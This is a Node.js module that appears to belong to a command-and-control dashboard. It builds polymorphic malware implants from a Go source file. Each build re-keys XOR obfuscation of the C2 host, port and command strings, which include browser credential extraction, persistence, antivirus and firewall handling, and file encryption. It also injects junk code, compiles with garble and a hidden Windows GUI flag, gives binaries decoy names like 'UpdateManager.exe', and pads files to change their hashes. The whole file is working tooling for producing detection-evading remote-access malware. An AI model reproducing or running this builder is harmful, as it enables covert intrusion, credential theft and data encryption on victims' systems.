/**
 * Polymorphic implant builder for lastfinalversion2.go
 * Each build: new XOR key, shift, re-obfuscated strings, junk stamp, unique buildid.
 */
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');

const ROOT = path.join(__dirname, '..');
const SOURCE = path.join(ROOT, 'lastfinalversion2.go');
const BUILDS_DIR = path.join(ROOT, 'builds');
const MANIFEST = path.join(BUILDS_DIR, 'index.json');

const PLAIN_COMMANDS = {
  obfTest: 'test',
  obfDebug: 'debug',
  obfUpload: 'upload',
  obfDownload: 'download',
  obfKill: 'kill',
  obfSysinfo: 'sysinfo',
  obfProcesses: 'processes',
  obfServices: 'services',
  obfNetwork: 'network',
  obfScreenshot: 'screenshot',
  obfRegistry: 'registry',
  obfStartup: 'startup',
  obfFirewall: 'firewall',
  obfAntivirus: 'antivirus',
  obfSetpass: 'setpass',
  obfGetpass: 'getpass',
  obfEncrypt: 'encrypt',
  obfDecrypt: 'decrypt',
  obfListencrypted: 'listencrypted',
  obfExtractbrowser: 'extractbrowser',
  obfExtractbrowserhidden: 'extractbrowserhidden',
  obfBrowserpaths: 'browserpaths',
  obfSetpersistence: 'setpersistence',
  obfRemovepersistence: 'removepersistence',
  obfCheckpersistence: 'checkpersistence',
  obfLs: 'ls',
  obfDir: 'dir',
  obfPwd: 'pwd',
  obfQ: 'q',
  obfCd: 'cd',
};

const APP_NAMES = [
  'AppLauncher.exe',
  'UpdateManager.exe',
  'SystemHelper.exe',
  'ServiceRunner.exe',
];

function ensureDirs() {
  fs.mkdirSync(BUILDS_DIR, { recursive: true });
}

function readManifest() {
  ensureDirs();
  if (!fs.existsSync(MANIFEST)) return [];
  try {
    return JSON.parse(fs.readFileSync(MANIFEST, 'utf8'));
  } catch {
    return [];
  }
}

function writeManifest(list) {
  ensureDirs();
  fs.writeFileSync(MANIFEST, JSON.stringify(list, null, 2));
}

function xorEncode(buf, key) {
  const k = Buffer.from(key);
  const out = Buffer.from(buf);
  for (let i = 0; i < out.length; i++) out[i] ^= k[i % k.length];
  return out;
}

function obfuscateString(input, xorKey) {
  const b64 = Buffer.from(String(input), 'utf8').toString('base64');
  return xorEncode(Buffer.from(b64, 'utf8'), xorKey).toString('hex');
}

function randomKey(len = 16) {
  const alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let s = '';
  const bytes = crypto.randomBytes(len);
  for (let i = 0; i < len; i++) s += alphabet[bytes[i] % alphabet.length];
  return s;
}

function randomId() {
  return `${Date.now().toString(36)}_${crypto.randomBytes(4).toString('hex')}`;
}

function which(cmd) {
  return new Promise((resolve) => {
    const isWin = process.platform === 'win32';
    const checker = isWin ? 'where.exe' : 'which';
    const p = spawn(checker, [cmd], { windowsHide: true });
    let out = '';
    p.stdout.on('data', (d) => { out += d.toString(); });
    p.on('error', () => resolve(null));
    p.on('close', (code) => resolve(code === 0 ? out.trim().split(/\r?\n/)[0] : null));
  });
}

function run(cmd, args, opts = {}) {
  return new Promise((resolve, reject) => {
    const child = spawn(cmd, args, {
      cwd: opts.cwd || ROOT,
      env: { ...process.env, ...opts.env },
      shell: false,
      windowsHide: true,
    });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (d) => { stdout += d.toString(); });
    child.stderr.on('data', (d) => { stderr += d.toString(); });
    child.on('error', reject);
    child.on('close', (code) => {
      if (code === 0) resolve({ stdout, stderr });
      else reject(new Error(stderr || stdout || `${cmd} exited ${code}`));
    });
  });
}

function mutateSource(src, { xorKey, shiftValue, host, port, stamp }) {
  let out = src;

  // xorKey const
  out = out.replace(
    /const xorKey = "[^"]*"/,
    `const xorKey = "${xorKey}"`
  );

  // shiftValue
  out = out.replace(
    /const shiftValue = \d+/,
    `const shiftValue = ${shiftValue}`
  );

  // command obfuscated strings
  for (const [name, plain] of Object.entries(PLAIN_COMMANDS)) {
    const hex = obfuscateString(plain, xorKey);
    const re = new RegExp(`(${name}\\s*=\\s*)"[0-9a-fA-F]+"`, 'g');
    out = out.replace(re, `$1"${hex}"`);
  }

  // app names slice
  const appHex = APP_NAMES.map((n) => `"${obfuscateString(n, xorKey)}"`).join(', ');
  out = out.replace(
    /obfAppNames\s*=\s*\[\]string\{[^}]+\}/,
    `obfAppNames                                                = []string{${appHex}}`
  );

  // C2 host / port
  const hostHex = obfuscateString(host, xorKey);
  const portHex = obfuscateString(String(port), xorKey);
  out = out.replace(/obfC2Host\s*=\s*"[0-9a-fA-F]+"/, `obfC2Host                                                  = "${hostHex}"`);
  out = out.replace(/obfPortStr\s*=\s*"[0-9a-fA-F]+"/, `obfPortStr                                                 = "${portHex}"`);

  // Force production path: ensure localtest flag stays false in this source copy
  // (we never compile localtest tag for dashboard builds)
  out = out.replace(
    /c2LocalTestMode bool/,
    `c2LocalTestMode bool // build:${stamp.slice(0, 12)}`
  );

  // Inject polymorphic stamp near package vars (changes binary layout/hash)
  const junkVar = `
// auto-generated polymorphic stamp — unique per build
var (
	polyStamp_${stamp.slice(0, 8)} = "${stamp}"
	polyNoise_${stamp.slice(8, 16)} = []byte{${Array.from(crypto.randomBytes(32)).join(', ')}}
)
`;
  out = out.replace('package main\n', `package main\n${junkVar}`);

  return out;
}

async function generateBuild(options = {}) {
  const platform = String(options.platform || 'windows').toLowerCase();
  if (platform !== 'windows' && platform !== 'linux') {
    throw new Error('platform must be windows or linux');
  }

  const arch = String(options.arch || 'amd64').toLowerCase();
  const host = String(options.host || process.env.BUILD_C2_HOST || '127.0.0.1').trim();
  const port = Number(options.port || process.env.BUILD_C2_PORT || process.env.TCP_PORT || 2026);
  if (!host) throw new Error('host is required');
  if (!port || port < 1 || port > 65535) throw new Error('invalid port');

  if (!fs.existsSync(SOURCE)) {
    throw new Error('lastfinalversion2.go not found');
  }

  const id = randomId();
  const xorKey = randomKey(16 + (crypto.randomBytes(1)[0] % 8));
  const shiftValue = 3 + (crypto.randomBytes(1)[0] % 15);
  const stamp = crypto.randomBytes(24).toString('hex');
  const buildid = crypto.randomBytes(16).toString('hex');

  const workDir = path.join(BUILDS_DIR, id);
  fs.mkdirSync(workDir, { recursive: true });

  const raw = fs.readFileSync(SOURCE, 'utf8');
  const mutated = mutateSource(raw, { xorKey, shiftValue, host, port, stamp });
  const goFile = path.join(workDir, 'main.go');
  fs.writeFileSync(goFile, mutated, 'utf8');

  // Platform helpers (build-tagged) — required for Linux cross-compile
  const platformFiles = [
    ['lastfinalversion2_platform_windows.go', 'platform_windows.go'],
    ['lastfinalversion2_platform_other.go', 'platform_other.go'],
  ];
  for (const [fromName, toName] of platformFiles) {
    const fromRoot = path.join(ROOT, fromName);
    const fromBuilder = path.join(__dirname, toName);
    const src = fs.existsSync(fromRoot) ? fromRoot : fromBuilder;
    if (!fs.existsSync(src)) throw new Error(`missing ${fromName}`);
    fs.copyFileSync(src, path.join(workDir, toName));
  }

  // Minimal go.mod for the temp module
  fs.writeFileSync(
    path.join(workDir, 'go.mod'),
    `module implant_build_${id.replace(/[^a-z0-9]/gi, '')}\n\ngo 1.21\n`,
    'utf8'
  );

  const ext = platform === 'windows' ? '.exe' : '';
  const baseName = (options.outputName || `implant_${platform}_${arch}`).replace(/[<>:"/\\|?*\s]/g, '_');
  const outName = baseName.endsWith(ext) || !ext ? `${baseName}${ext || ''}` : `${baseName}${ext}`;
  const outPath = path.join(workDir, outName);

  const ldflags = platform === 'windows'
    ? `-s -w -H=windowsgui -buildid=${buildid}`
    : `-s -w -buildid=${buildid}`;

  const env = {
    GOOS: platform === 'windows' ? 'windows' : 'linux',
    GOARCH: arch,
    CGO_ENABLED: '0',
  };

  // Add debugging for 386 builds
  if (arch === '386') {
    console.log(`[BUILDER] Building 386 binary: ${outPath}`);
    console.log(`[BUILDER] GOOS=${env.GOOS} GOARCH=${env.GOARCH}`);
  }

  const garblePath = await which('garble');
  let tool = 'go';
  let args;

  // Build package (.) so platform_*.go build tags are included
  if (garblePath) {
    tool = garblePath;
    args = ['-literals', '-tiny', `-seed=${stamp}`, 'build', `-ldflags=${ldflags}`, '-o', outPath, '.'];
  } else {
    tool = 'go';
    args = ['build', '-trimpath', `-ldflags=${ldflags}`, '-o', outPath, '.'];
  }

  try {
    await run(tool, args, { cwd: workDir, env });
  } catch (e) {
    // If garble failed, fall back to plain go
    if (tool !== 'go') {
      await run('go', ['build', '-trimpath', `-ldflags=${ldflags}`, '-o', outPath, '.'], { cwd: workDir, env });
      tool = 'go (fallback)';
    } else {
      throw e;
    }
  }

  if (!fs.existsSync(outPath)) {
    throw new Error('Build finished but output file missing');
  }

  // Append polymorphic padding (changes file hash without breaking PE/ELF load)
  const pad = crypto.randomBytes(256 + (crypto.randomBytes(1)[0] % 3840));
  fs.appendFileSync(outPath, pad);

  const stat = fs.statSync(outPath);
  const sha256 = crypto.createHash('sha256').update(fs.readFileSync(outPath)).digest('hex');

  const meta = {
    id,
    platform,
    arch,
    host,
    port,
    fileName: outName,
    size: stat.size,
    sha256,
    xorKeyLen: xorKey.length,
    shiftValue,
    stamp: stamp.slice(0, 16),
    tool: path.basename(String(tool)),
    createdAt: new Date().toISOString(),
  };
  fs.writeFileSync(path.join(workDir, 'meta.json'), JSON.stringify(meta, null, 2));

  const list = readManifest();
  list.unshift(meta);
  writeManifest(list.slice(0, 100));

  return meta;
}

function getBuildPath(id) {
  const list = readManifest();
  const meta = list.find((b) => b.id === id);
  if (!meta) return null;
  const filePath = path.join(BUILDS_DIR, id, meta.fileName);
  if (!fs.existsSync(filePath)) return null;
  return { meta, filePath };
}

function listBuilds() {
  return readManifest();
}

function deleteBuild(id) {
  const list = readManifest();
  const buildIndex = list.findIndex(b => b.id === id);
  if (buildIndex === -1) {
    console.log(`Build ${id} not found in manifest`);
    return false;
  }

  const build = list[buildIndex];
  const buildDir = path.join(BUILDS_DIR, id);
  
  console.log(`Attempting to delete build ${id} from ${buildDir}`);
  
  try {
    // Remove build directory and all files
    if (fs.existsSync(buildDir)) {
      console.log(`Removing directory: ${buildDir}`);
      fs.rmSync(buildDir, { recursive: true, force: true });
    } else {
      console.log(`Directory ${buildDir} does not exist`);
    }
    
    // Remove from manifest
    list.splice(buildIndex, 1);
    writeManifest(list);
    
    console.log(`Successfully deleted build ${id}`);
    return true;
  } catch (e) {
    console.error(`Failed to delete build ${id}:`, e);
    return false;
  }
}

module.exports = {
  generateBuild,
  listBuilds,
  getBuildPath,
  deleteBuild,
  BUILDS_DIR,
};
